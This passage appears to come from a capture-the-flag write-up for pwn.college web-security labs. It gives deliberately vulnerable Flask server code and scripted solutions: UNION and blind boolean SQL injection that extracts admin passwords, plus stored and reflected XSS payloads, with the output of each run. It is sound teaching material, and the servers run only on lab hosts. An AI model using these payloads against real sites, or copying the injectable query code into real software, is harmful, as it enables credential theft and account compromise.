<html><body>Hello, admin!<br>Here is your flag: pwn.college{49UcaQ5MIlt0c-jwN289CZNiRzV.dBTOzMDL4ITM0EzW}

        <hr>
        <form method=post>
        User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
        </form>
        </body></html>
```

&nbsp;

## SQLi 3

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute(f"""INSERT INTO users SELECT "guest" as username, "password" as password""")


@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:

        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80"
params = {
    "query": 'admin" UNION SELECT password FROM users WHERE username="admin"-- -'
}
response = requests.get(url, params = params)
print(response.text)
```

This time the flag is stored in the `password` field of the `admin` user. However, the `password` is never printed in the original query:

```sql
SELECT username FROM users WHERE username LIKE "{query}"
```

### SQL injection

#### UNION attack

Let's try the following parameters:

```
query: admin" UNION SELECT password FROM users WHERE username="admin"-- - 
```

The resultant SQL query will be:

```sql
SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username="admin"-- -"
```

```
hacker@web-security~sqli-3:/$ python ~/script.py 

        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='admin" UNION SELECT password FROM users WHERE username="admin"-- -'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username="admin"-- -"</pre><br>
        <b>Results:</b><pre>admin
pwn.college{wz14oEOmcepM7OVPxb4zm3bCC2L.dFTOzMDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## SQLi 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import random
import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")


@app.route("/", methods=["GET"])
def challenge():
    query = flask.request.args.get("query", "%")

    try:
        # https://www.sqlite.org/schematab.html
        # https://www.sqlite.org/lang_select.html
        sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
        print(f"DEBUG: {query=}")
        results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
    except sqlite3.Error as e:
        results = f"SQL error: {e}"

    return f"""
        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='{query}'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>{ sql.replace(random_user_table, "REDACTED") }</pre><br>
        <b>Results:</b><pre>{results}</pre>
        </body></html>
        """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

In this challenge, the table name is randomized, so we first have to figure that out.

### SQL injection
#### Retrieving SQLite version

The SQLite version can be retrieved using the following query:

```
SELECT sqlite_version();
```

If we provide the following request:

```
query: 'admin" UNION SELECT sqlite_version()-- -'
```

The resultant query will be:

```sql
SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sqlite_version()-- -"
```

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80"
params = {
    "query": 'admin" UNION SELECT sqlite_version-- -'
}
response = requests.get(url, params = params)
print(response.text)
```

```
hacker@web-security~sqli-4:/$ python ~/script.py 

        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='admin" UNION SELECT sqlite_version()-- -'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT sqlite_version()-- -"</pre><br>
        <b>Results:</b><pre>3.31.1
admin</pre>
        </body></html>
```

#### Listing the tables

For SQLite versions `3.33.0` and previous, the `sqlite_master` table contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.

```
SELECT sql FROM sqlite_master;
```

If we provide the following request:

```
query: 'admin" UNION SELECT sql FROM sqlite_master-- -'
```

The resultant query will be:

```sql
SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT sql FROM sqlite_master-- -"
```

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80"
params = {
    "query": 'admin" UNION SELECT sql FROM sqlite_master-- -'
}
response = requests.get(url, params = params)
print(response.text)
```

```
hacker@web-security~sqli-4:/$ python ~/script.py 

        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='admin" UNION SELECT sql FROM sqlite_master-- -'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT sql FROM sqlite_master-- -"</pre><br>
        <b>Results:</b><pre>CREATE TABLE users_4902969274(username,password)
admin</pre>
        </body></html>
```

#### Retrieving the password

Now that we know the table name is `users_4902969274`, we can easily retrieve the password from the table.

If we provide the following request:

```
query: 'admin" UNION SELECT password FROM users_4902969274-- -'
```

The resultant query will be:

```sql
SELECT username FROM {random_user_table} WHERE username LIKE "admin" UNION SELECT password FROM users_4902969274-- -"
```

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80"
params = {
    "query": 'admin" UNION SELECT password FROM users_4902969274-- -'
}
response = requests.get(url, params = params)
print(response.text)
```

```
hacker@web-security~sqli-4:/$ python ~/script.py 

        <html><body>Welcome to the user query service!
        <form>Query:<input type=text name=query value='admin" UNION SELECT password FROM users_4902969274-- -'><input type=submit value=Submit></form>
        <hr>
        <b>Query:</b> <pre>SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT password FROM REDACTED-- -"</pre><br>
        <b>Results:</b><pre>admin
password
pwn.college{AlwY4pMMjmQroxd9XEXlpIAKgEF.dJTOzMDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## SQLi 5

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")


@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Password:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

### SQL injection

#### Blind attack
Before we perform the attack we need to learn more about the `SUBSTR()` function.

![image](https://github.com/Kunull/Write-ups/assets/110326359/ec609e62-def0-46f2-b58a-cb7d332e11ca)

```
## Extract the one character from the string starting at the first position
SUBSTR("pwn.college", 1, 1)

## Result:
p
```

```
## Extract the one character from the string starting at the second position
SUBSTR("pwn.college", 2, 1)

## Result:
w
```

```
## Extract the one character from the string starting at the third position
SUBSTR("pwn.college", 3, 1)

## Result:
n
```

Now we have to write a script that loops over and checks the next byte with a set of characters.

We also need to create an empty string.
If the script finds the `Hello, {username}!` message, within the response, it will append the character to the flag string.

```py title="~/script.py" showLineNumbers
import string
import requests

searchspace = ''.join(chr(i) for i in range(32, 127)) 
solution = ''
url = "http://challenge.localhost:80"

while True:
    found = False
    for char in searchspace:
        payload = f"admin' AND SUBSTR(password, {len(solution)+1}, 1) = '{char}'-- -"
        data = {
            "username": payload,
            "password": "irrelevant"
        }

        response = requests.post(url, data=data)

        if "Hello" in response.text:
            solution += char
            print(f"[+] Found so far: {solution}")
            found = True
            break

    if not found:
        print("[*] Done. Final password:", solution)
        break
```

```
hacker@web-security~sqli-5:/$ python ~/script.py 
[+] Found so far: p
[+] Found so far: pw
[+] Found so far: pwn
[+] Found so far: pwn.
[+] Found so far: pwn.c
[+] Found so far: pwn.co
[+] Found so far: pwn.col
[+] Found so far: pwn.coll
[+] Found so far: pwn.colle
[+] Found so far: pwn.colleg
[+] Found so far: pwn.college
[+] Found so far: pwn.college{
[+] Found so far: pwn.college{Q
[+] Found so far: pwn.college{Qc
[+] Found so far: pwn.college{Qcq
[+] Found so far: pwn.college{QcqW
[+] Found so far: pwn.college{QcqWG
[+] Found so far: pwn.college{QcqWGp
[+] Found so far: pwn.college{QcqWGpB
[+] Found so far: pwn.college{QcqWGpBU
[+] Found so far: pwn.college{QcqWGpBUx
[+] Found so far: pwn.college{QcqWGpBUx2
[+] Found so far: pwn.college{QcqWGpBUx29
[+] Found so far: pwn.college{QcqWGpBUx29_
[+] Found so far: pwn.college{QcqWGpBUx29_s
[+] Found so far: pwn.college{QcqWGpBUx29_s2
[+] Found so far: pwn.college{QcqWGpBUx29_s2h
[+] Found so far: pwn.college{QcqWGpBUx29_s2hu
[+] Found so far: pwn.college{QcqWGpBUx29_s2huw
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwr
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwru
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruw
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwT
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTk
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkm
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmE
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEW
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWU
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.d
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dN
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNT
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTO
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOz
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzM
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMD
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4I
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4IT
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0E
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0Ez
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW
[+] Found so far: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW}
[*] Done. Final password: pwn.college{QcqWGpBUx29_s2huwruwTkmEWUn.dNTOzMDL4ITM0EzW}
```

&nbsp;

## XSS 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")


@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"

    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"

    return page + "</body></html>"


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim"
#!/opt/pwn.college/python

import requests
import psutil
import sys
import re

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}...")
try:
    num_inputs = len(re.findall(r"<input[^<]*>", requests.get(challenge_url, timeout=1).text))
    if num_inputs <= 2:
        print("You did not inject an <input> textbox...")
    else:
        print("You got it! Here is your flag:")
        print(flag)
except requests.exceptions.ConnectionError:
    print("Connection error... Is the service running?")
```

### Stored XSS

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/"
data = {
    "content": '<input type="text" name="hacked" value="hacked_field">'
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~xss-1:/$ python ~/script.py 
<html><body>
Welcome to pwnpost, the anonymous posting service. Post away!
<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
<hr>First Post!
<hr>
<hr>
<hr>
<hr>
<hr>
<hr><input type="text" name="hacked" value="hacked_field">
</body></html>
```

```
hacker@web-security~xss-1:/$ /challenge/victim 
Visiting http://challenge.localhost:80/...
You got it! Here is your flag:
pwn.college{oKSpnMBRvQ_s3QCiR8iUHi5jYki.dVzN1YDL4ITM0EzW}
```

&nbsp;

## XSS 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")


@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"

    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"

    return page + "</body></html>"


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

challenge_url = "http://challenge.localhost:80/"

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```

### Stored XSS

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/"
data = {
    "content": '<script>alert("PWNED");</script>'
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~xss-2:/$ python ~/script.py 
<html><body>
Welcome to pwnpost, the anonymous posting service. Post away!
<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
<hr>First Post!
<hr><script>alert("PWNED");</script>
</body></html>
```

```
hacker@web-security~xss-2:/$ /challenge/victim 
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Visiting http://challenge.localhost:80/
Alert triggered! Your reward:
pwn.college{83-kdoROKPFKt41J3io0LjQC8eO.ddzN1YDL4ITM0EzW}
```

&nbsp;

## XSS 3

### Source code
```py title="/challenge/server"
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        {flask.request.args.get("msg", "(none)")}
        <hr>
        <form>
            Craft a message:
            <input type=text name=msg>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim"
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} URL")
    sys.exit(1)

challenge_url = sys.argv[1]

url_parsed = urllib.parse.urlparse(challenge_url)
if url_parsed.hostname != "challenge.localhost":
    print("Hostname should be 'challenge.localhost'.")
    sys.exit(2)
if url_parsed.port not in {None, 80}:
    print("Port should be 80.")
    sys.exit(3)

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```

### Reflected XSS

This time, the XSS will be refected. we have to create the necessary alert using the `msg` parameter.

```
hacker@web-security~xss-3:/$ /challenge/victim http://challenge.localhost:80/?msg="<script>alert(1);</script>"
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Visiting http://challenge.localhost:80/?msg=<script>alert(1);</script>
Alert triggered! Your reward:
pwn.college{I_QWbqFWsFZYTlRjUHIJO8nzbX6.dRTOzMDL4ITM0EzW}
```

&nbsp;

## XSS 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/", methods=["GET"])
def challenge_get():
    return f"""
        <html><body>
        <h1>pwnmsg ephemeral message service</h1>
        The message:
        <form>
            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
            <input type=submit value="Make URL!">
        </form>
        </body></html>
    """


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} URL")
    sys.exit(1)

challenge_url = sys.argv[1]

url_parsed = urllib.parse.urlparse(challenge_url)
if url_parsed.hostname != "challenge.localhost":
    print("Hostname should be 'challenge.localhost'.")
    sys.exit(2)
if url_parsed.port not in {None, 80}:
    print("Port should be 80.")
    sys.exit(3)

print(f"Visiting {challenge_url}")
browser.get(challenge_url)
try:
    WebDriverWait(browser, 1).until(EC.alert_is_present())
except TimeoutException:
    print("Failure: JavaScript alert did not trigger...")
    sys.exit(3)
else:
    print("Alert triggered! Your reward:")
    print(open("/flag").read().strip())
```

### Reflected XSS

This time, we have to escape the `<textarea>` so that our input is treated as code, and not simple text.

```
hacker@web-security~xss-4:/$ /challenge/victim http://challenge.localhost:80/?msg="</textarea><script>alert(1);</script>"
Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
Visiting http://challenge.localhost:80/?msg=</textarea><script>alert(1);</script>
Alert triggered! Your reward:
pwn.college{o7wdmvRzvfztdZPRvbCm3SV9fBI.dVTOzMDL4ITM0EzW}
```

&nbsp;

## XSS 5

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")


@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["username"] = username
    return flask.redirect("/")


@app.route("/draft", methods=["POST"])
def challenge_draft():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
    )
    return flask.redirect("/")


@app.route("/publish", methods=["GET"])
def challenge_publish():
    if "username" not in flask.session:
        flask.abort(403, "Log in first!")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
    return flask.redirect("/")


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username = flask.session.get("username", None)
    if username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <a href=publish>Publish your drafts!</a>
            <hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

```py title="/challenge/victim" showLineNumbers
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)

challenge_url = "http://challenge.localhost:80/"

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip())
browser.find_element(By.NAME, "submit").submit()

time.sleep(2)
print("Visited! Go check if the attack worked!")
```


### Stored XSS

In this challenge, we have to make the `admin` visit the `/publish` endpoint, so that their draft post is published and we can get the flag.

For this we have to follow multiple steps:
- Login as either the `hacker` or `guest` user
- Make a draft, which contains our payload
